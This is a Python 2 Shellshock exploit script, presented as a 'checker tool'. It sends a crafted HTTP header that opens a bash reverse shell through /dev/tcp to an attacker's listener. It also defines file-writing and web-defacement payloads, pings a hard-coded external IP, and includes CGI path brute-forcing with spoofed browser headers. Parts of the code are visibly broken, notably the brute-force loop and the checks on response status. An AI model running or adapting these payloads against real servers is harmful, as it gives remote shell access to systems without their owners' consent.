import httplib
import time
import sys, os

target_host = ''
target_port = 80  # Default HTTP port
target_path = ''

Payload_1 = 'echo \'Sh3llsh0ck3d!\' > exploited.txt'
Payload_2 = 'cd /usr/local/apache2/htdocs/ && echo \'<html><body><h1>OMG i got Shellshocked!</h1></body></html>\''
Payload_3 = 'ping 185.143.173.62'
Expl0it = '() { ignored;};'


legit_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Referer": "https://www.google.ru/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4"}


def banner():
    banner_text = '''\n
   _____ _          _ _     _                _    
  / ____| |        | | |   | |              | |   
 | (___ | |__   ___| | |___| |__   ___   ___| | __
  \___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ /
  ____) | | | |  __/ | \__ \ | | | (_) | (__|   < 
 |_____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_|
                                                    () { :; };
        checker tool\n
    Created by r4z0r5 for DSEC, 2017

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Usage is so simple even a monkey can handle it:
Simply input everything the script would ask you for ;)

Path to CGI-sctipt is not required if you are using the -b flag

Flags:

b  - Brute force the path to CGI scripts. Using this flag also requires You to point a path to the dictionary (flag d),\nif you dont want to use the default one.
     
     Example : Shellshocker.py b plsleavemealone.com d Desktop/dicts/somedict.txt
h  - Check which header is vulnerable. In this mode tool will check multiple headers for the vulnerability.    
  
     Example : Shellshocker.py h pwnmepls.io /cgi-bin/vulnerable.cgi
t  - Simple Shellshock check.
         
     Example : Shellshcoker.py t shellshock.me /cgi-bin/shockme.cgi     
    
    '''
    print(banner_text)
    return

def Shock(target_host, target_port, target_path, listener):
    reverse_shell = "() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % listener
    result = False
    malicious_headers = {"Content-type": "application/x-www-form-urlencoded",
                         "test": reverse_shell}

    connection = httplib.HTTPConnection(host=target_host, port=target_port)


    print '\n[*]Sending out a request with malicious headers.'
    print '\n[*]Request method : GET, Request url = ', target_path, '\nHeaders: ', malicious_headers
    req2 = connection.request("GET", url=target_path, headers=malicious_headers)
    response = connection.getresponse()
    if response.status == 200:
        print 'Exploitation seems to be successful, check you\'r listener!'
        result = True
    else:
        print 'There might be an error in server handling our malicious request.'
        result = False

    return result


def Bruteforce_CGIS(target_host,target_port,dictionary_path,legit_headers):
    ### Opening the dict file
    try:
        open(dictionary_path,'r')
    except IOError:
        print 'File or directory not found.'
        banner()
    print 'Running in the Brute-Force mode.'

    result = False
    con = httplib.HTTPConnection(host=target_host, port=target_port)
    for line in dictionary_path:
        req = con.request("GET", url=target_path, headers=legit_headers)
        response = con.getresponse()
        if response == 200:
            print '+' * 30, line, response.status,response.reason, '+' * 30
        if response == 403:
            print line, response.status,response.reason
        if response == 404:
            print line, 'Not Found'
    return result

def Connection_check(target_host,target_port,target_path,legit_headers):
    result = False
    con = httplib.HTTPConnection(host=target_host,port=target_port)
    req = con.request("GET",url=target_path, headers=legit_headers) ### Socket error number 10061, could be poor net~~~~~
    response = con.getresponse()
    print response.status,response.reason,response.msg
    if response.status == 403:
        print 'Access denied, try different CGI path.'
        time.sleep(5)
        banner()
    if response.status == 404:
        print 'Page does not exist, try different path.'
        time.sleep(5)
        banner()
    if response.status == 400:
        print 'Bad request error.'
        time.sleep(5)
        banner()
    if response.status == 500:
        print 'Congrats, server is dead!'
        time.sleep(5)
        banner()
    if response.status == 200:
        result = True
    con.close()
    return result

"""

A C T U A L   B E G I N N I N G

"""


banner()

test_type = ''

target_host = raw_input('Target host:')

user_response_0 = raw_input('Do you know the path to target CGI scrip?(Y or N):')
print user_response_0   
if 'Y' in user_response_0:
    path_known = True
elif 'N' in user_response_0:
    path_known = False
elif 'Y' or 'N' not in user_response_0:
    print 'Unknown input! (expected Y or N), input received: ', user_response_0, '\n', type(user_response_0)
    exit()
if path_known:
    target_path = raw_input('Enter the CGI script path:')
    print '\nThe CGI path is known, you have 2 test types available:\n1. Simple shellshock test (Flag t)\n2.Vulnerable' \
          ' header brute-force (Flag b)'
    test_type = raw_input('What test to perform? (t or b):')
    if 't' in test_type:
        listener = raw_input('Enter the listener adress (IP/PORT, eg 127.0.0.1/80):')
        print 'Checking connection.'
        if Connection_check(target_host, target_port, target_path, legit_headers):
            print 'Performing simple Shellshock check'
            Shock(target_host, target_port, target_path, listener)
        else:
            print 'Connection failed.'
            time.sleep(3)
            banner()
    elif 'b' in test_type:
        print 'This feature is currently in development an unstable, who cares though?'



else:
    user_response = 'Would you like to brute-force possible CGI paths? (Y or N)'
    if user_response == 'Y':
        user_response_2 = raw_input('Would you like to use a default Shellshock Swiss Army tool\'s dictionary?')
        if user_response_2 == 'Y':
            dictionary_path = 'cgis2.txt'
            listener = raw_input('Enter the listener ip (IP/Port, eg. 192.168.1.2/4444)')
            Bruteforce_CGIS(target_host, target_port, dictionary_path, listener)
        if user_response_2 == 'N':
            dictionary_path = raw_input('Enter the path to a dictionary file in TXT format.')
        else:
            print 'Unknown input! (expected Y or N)'
            exit()
    if user_response == 'N':
        print 'Well, okay..'
        exit()
    else:
        print 'Unknown input! (expected Y or N)'
        exit()
